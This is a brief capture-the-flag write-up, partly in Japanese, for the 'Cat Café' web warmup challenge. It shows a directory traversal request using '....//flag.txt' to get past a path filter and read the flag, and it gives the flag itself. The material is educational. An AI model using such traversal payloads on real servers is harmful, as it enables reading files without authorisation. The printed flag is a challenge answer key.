tag: web, warmup

Cat Café
95 pts

authored by ptr-yudai

Which cat do you like the most?

https://cat-cafe.2023.ricercactf.com:8000

=====

 %2e%2e%2f / flag.txt のようなリクエストを送ればいいんだろうけど。どうすればいいのかな、などと考えていた、深く（というか）そのまま素直に理解をして、以下のようなアクセスをすることでファイルを読めた
 
 http://cat-cafe.2023.ricercactf.com:8000//img?f=....//flag.txt
 RicSec{directory_traversal_is_one_of_the_most_common_vulnearbilities}

